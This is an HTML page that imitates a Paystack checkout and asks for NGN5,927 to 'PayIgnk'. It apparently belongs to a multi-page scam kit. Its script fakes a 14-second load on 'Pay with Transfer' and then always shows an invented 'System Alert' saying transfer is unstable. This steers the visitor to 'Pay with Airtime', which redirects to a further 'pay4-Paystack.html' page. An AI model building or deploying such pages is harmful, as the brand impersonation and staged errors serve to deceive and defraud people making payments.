<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Paystack Checkout</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu;
      background: #f9f9f9;
      color: #333;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start; /* Aligns the box to the top exactly like the screenshot */
      min-height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 500px;
      background: white;
      padding: 30px 24px;
      border-radius: 16px;
      box-shadow: 0 5px 25px rgba(0,0,0,0.06);
      margin-top: 20px; /* Precise top spacing */
    }

    h3 {
      color: #10b981;
      font-weight: 800;
      font-size: 19px;
      margin-bottom: 12px;
      letter-spacing: 0.5px;
    }

    p {
      font-size: 14px;
      color: #555;
      line-height: 1.5;
      margin-bottom: 25px;
    }

    .option {
      display: flex;
      align-items: center;
      padding: 18px 10px;
      border-top: 1px solid #eee;
      cursor: pointer;
      background: none;
      border-left: none;
      border-right: none;
      border-bottom: none;
      width: 100%;
      text-align: left;
      transition: background 0.2s;
    }

    .option:hover {
      background: #fcfcfc;
    }

    .option span {
      margin-left: 16px;
      font-size: 15px;
      font-weight: 600;
      color: #2c3e50;
    }

    .icon-container {
      width: 24px;
      height: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #000000;
    }

    .cancel {
      margin-top: 35px;
      text-align: center;
    }

    .cancel button {
      background: none;
      border: 1px solid #dcdcdc;
      color: #0084ff;
      font-weight: 600;
      font-size: 13px;
      padding: 10px 24px;
      border-radius: 8px;
      cursor: pointer;
      transition: all 0.2s;
    }

    .cancel button:hover {
      background: #f9f9f9;
      border-color: #ccc;
    }

    /* Professional Modal Alert overlay */
    .modal-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.45);
      z-index: 10000;
      justify-content: center;
      align-items: center;
      padding: 20px;
      backdrop-filter: blur(2px);
    }

    .modal-box {
      background: white;
      width: 100%;
      max-width: 380px;
      border-radius: 12px;
      padding: 24px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0,0,0,0.15);
      animation: scaleUp 0.15s ease-out;
    }

    @keyframes scaleUp {
      from { transform: scale(0.96); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    .modal-icon {
      width: 44px;
      height: 44px;
      background: #fffbeb;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #d97706;
      margin: 0 auto 14px auto;
    }

    .modal-title {
      font-size: 17px;
      font-weight: 700;
      color: #1f2937;
      margin-bottom: 8px;
    }

    .modal-text {
      font-size: 13.5px;
      color: #6b7280;
      line-height: 1.5;
      margin-bottom: 20px;
    }

    .modal-btn {
      width: 100%;
      background: #111827;
      color: white;
      border: none;
      padding: 11px;
      font-size: 13.5px;
      font-weight: 600;
      border-radius: 6px;
      cursor: pointer;
    }

    .modal-btn:hover {
      background: #1f2937;
    }

    /* Loading Screen overlay */
    .loading-screen {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(255, 255, 255, 0.9);
      z-index: 9999;
      justify-content: center;
      align-items: center;
      font-size: 18px;
      font-weight: bold;
    }

    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #10b981;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-bottom: 10px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="container">
    <h3>PAYSTACK CHECKOUT</h3>
    <p>Use one of the payment methods below to pay NGN5,927 to PayIgnk</p>

    <!-- 1st: Pay with Transfer -->
    <button class="option" onclick="payWithTransfer()">
      <div class="icon-container">
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="9" y1="9" x2="15" y2="9"/><line x1="12" y1="9" x2="12" y2="15"/></svg>
      </div>
      <span>Pay with Transfer</span>
    </button>

    <!-- 2nd: Pay with Airtime -->
    <button class="option" onclick="payWithAirtime()">
      <div class="icon-container">
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
      </div>
      <span>Pay with Airtime</span>
    </button>

    <div class="cancel">
      <button onclick="cancel()">× Cancel Payment</button>
    </div>
  </div>

  <!-- Real System Alert Modal -->
  <div class="modal-overlay" id="alertModal">
    <div class="modal-box">
      <div class="modal-icon">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
      </div>
      <h4 class="modal-title">System Alert</h4>
      <p class="modal-text">Pay with transfer is currently unstable. Please try the other option to complete your transaction.</p>
      <button class="modal-btn" onclick="closeAlert()">Okay</button>
    </div>
  </div>

  <!-- Loading Overlay -->
  <div class="loading-screen" id="loader">
    <div style="text-align: center;">
      <div class="spinner"></div>
    </div>
  </div>

  <script>
    const loader = document.getElementById('loader');
    const alertModal = document.getElementById('alertModal');

    // Loads for exactly 14 seconds before showing the modal
    function payWithTransfer() {
      loader.style.display = 'flex';
      
      setTimeout(() => {
        loader.style.display = 'none';
        alertModal.style.display = 'flex';
      }, 14000); // 14,000 milliseconds = 14 seconds
    }

    function closeAlert() {
      alertModal.style.display = 'none';
    }

    // Standard redirect sequence for Airtime
    function payWithAirtime() {
      loader.style.display = 'flex';
      setTimeout(() => {
        window.location.href = "pay4-Paystack.html";
      }, 3000);
    }

    function cancel() {
      window.history.back();
    }
  </script>
</body>
</html>
